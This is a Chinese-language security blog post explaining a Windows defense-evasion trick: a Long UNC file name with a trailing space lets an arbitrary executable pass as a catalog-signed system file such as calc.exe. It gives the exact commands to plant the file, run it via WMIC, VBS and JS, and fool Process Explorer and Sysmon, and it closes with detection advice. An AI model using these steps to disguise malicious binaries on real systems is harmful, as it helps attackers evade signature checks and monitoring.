---
layout: post
title: Catalog签名伪造——Long UNC文件名欺骗
---


## 0x00 前言
---

在之前的两篇文章[《Authenticode签名伪造——PE文件的签名伪造与签名验证劫持》](https://3gstudent.github.io/3gstudent.github.io/Authenticode%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0-PE%E6%96%87%E4%BB%B6%E7%9A%84%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0%E4%B8%8E%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81%E5%8A%AB%E6%8C%81/)和[《Authenticode签名伪造——针对文件类型的签名伪造》](https://3gstudent.github.io/3gstudent.github.io/Authenticode%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0-%E9%92%88%E5%AF%B9%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0/)介绍了Authenticode签名伪造的利用方法，这次将要介绍一个Catalog签名伪造的方法，利用Long UNC文件名欺骗系统，获得系统内置的Catalog签名

**注：**

本文介绍的技巧参考自Matt Graeber@mattifestation公开的资料，本文将结合自己的经验，整理相关内容，添加个人理解。

参考资料：

http://www.exploit-monday.com/2013/02/WindowsFileConfusion.html?m=1

## 0x01 简介
---

本文将要介绍以下内容：

- Long UNC基础知识
- Long UNC文件名欺骗的方法
- Long UNC文件名欺骗优缺点分析

## 0x02 Long UNC介绍
---

### UNC（Universal Naming Convention）

通用命名规则，可用来表示Windows系统中文件的位置

详细介绍可参考如下链接：

https://en.wikipedia.org/wiki/Path_(computing)

### Long UNC

正常UNC支持的最大长度为260字符

为了支持更长的字符，引入了Long UNC，支持最大长度为32767

格式举例： `\\?\C:\test\a.exe`

```
type putty.exe > "\\?\C:\test\longUNC.exe"
```

如下图，使用Long UNC的文件同普通文件没有区别

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-17/2-1.png)

**特别用法：**

如果在Long UNC文件名后面加一个空格，系统对文件名的判断将发生错误

```
type putty.exe > "\\?\C:\test\mimikatz.exe "
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-17/2-2.png)

将putty.exe重命名为`"\\?\C:\test\mimikatz.exe "`，右键查看`"\\?\C:\test\mimikatz.exe "`的文件属性

发现了奇怪的地方：**属性显示该文件为样本文件mimikatz.exe的属性**

直观理解：特殊Long UNC的文件能够欺骗系统，将其识别为另一个文件

## 0x03 Long UNC文件名欺骗的方法
---

由上节测试，我们知道利用Long UNC能够复制文件属性

那么，如果复制的是系统文件，甚至是带有catalog签名的文件，是否能实现catalog的签名伪造？

### 测试1： 伪造calc.exe的catalog签名

测试系统： Win7 x86

使用sigcheck.exe查看calc.exe的catalog签名：

```
sigcheck.exe -i c:\windows\system32\calc.exe
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-17/3-1.png)

Long UNC文件伪造:

```
type putty.exe > "\\?\C:\Windows\System32\calc.exe "
```

**注：**

输出到`c:\windows\system32\`需要管理员权限

特殊文件名必须放在目标的同级目录下，即`C:\Windows\System32`，否则启动失败

如下图，验证结论，特殊Long UNC能够复制文件属性

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-17/3-2.png)

在之前的文章[《Hidden Alternative Data Streams的进阶利用技巧》](https://3gstudent.github.io/3gstudent.github.io/Hidden-Alternative-Data-Streams%E7%9A%84%E8%BF%9B%E9%98%B6%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/)介绍过特殊文件名可用短文件名代替

获取短文件名：

```
dir /x calc*.exe
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-17/3-3.png)

`"\\?\C:\Windows\System32\calc.exe "`可用短文件名CALC~1.EXE代替


使用sigcheck.exe查看该文件的catalog签名：

```
sigcheck.exe -i "\\?\C:\Windows\System32\calc.exe "
```

or

```
sigcheck.exe -i C:\Windows\System32\CALC~1.EXE
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-17/3-4.png)

成功伪造catalog签名

### 测试2： 执行特殊Long UNC文件

1、无法双击执行

2、通过命令行

```
"\\?\C:\Windows\System32\calc.exe "
```

提示系统找不到指定的路径

```
C:\Windows\System32\CALC~1.EXE
```

启动正常calc.exe

3、通过WMIC

```
wmic process call create C:\Windows\System32\CALC~1.exe
```

4、通过vbs

```
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "c:\windows\system32\calc~1.exe"
```

5、通过js

```
var wsh=new ActiveXObject("wscript.shell");  
wsh.run("c:\\windows\\system32\\calc~1.exe");
```

启动后，进程名为calc~1.exe

**特别的地方：**

通过Process Explorer验证进程签名，识别为calc.exe的默认微软证书

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-17/3-5.png)

**注：**

关于文件的描述，例如截图中的`"SSH, Telnet and Rlogin client"`可通过修改程序的资源进行伪造，方法暂略

得出结论： **执行特殊Long UNC文件能够欺骗Process Explorer的进程签名验证**

**补充：**

能够欺骗Sysmon的部分日志监控功能，例如Process creation

### 测试3： 无法欺骗的工具

1、使用certutil.exe计算MD5

```
certutil.exe -hashfile C:\Windows\System32\calc.exe MD5

certutil.exe -hashfile C:\Windows\System32\calc~1.exe MD5
```

**注：**

```
certutil.exe -hashfile "\\?\C:\Windows\System32\calc.exe " MD5
```

报错提示系统找不到文件

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-17/3-6.png)

### 测试4： 多个同名文件夹的生成

```
type putty.exe > "\\?\C:\Windows\System32\calc.exe "
type putty.exe > "\\?\C:\Windows\System32\calc.exe  "
type putty.exe > "\\?\C:\Windows\System32\calc.exe   "
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-17/3-7.png)

### 测试5： 特殊Long UNC文件的删除

```
del "\\?\C:\Windows\System32\calc.exe "
```

or 

```
del C:\Windows\System32\CALC~1.exe
```

### 测试6： 其他系统测试

支持Win7-Win10

64位系统需要注意重定向问题

## 0x04 利用分析
---

利用特殊Long UNC文件名欺骗系统对文件路径的判断，实现伪造catalog签名

**特点：**

欺骗系统对文件名的检查，将文件伪造成系统文件，伪造catalog签名

**防御检测：**

1、权限控制

欺骗系统文件，需要有系统文件夹的可写权限

2、文件识别

同级目录同名文件

3、进程名判断

特殊进程名，格式为短文件名，例如CALC~1.EXE

4、工具检测

使用certutil.exe校验文件hash


## 0x05 小结
---

本文介绍了利用特殊Long UNC文件名欺骗系统并获得Catalog签名的技巧，分析利用方法，分享防御思路



---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)




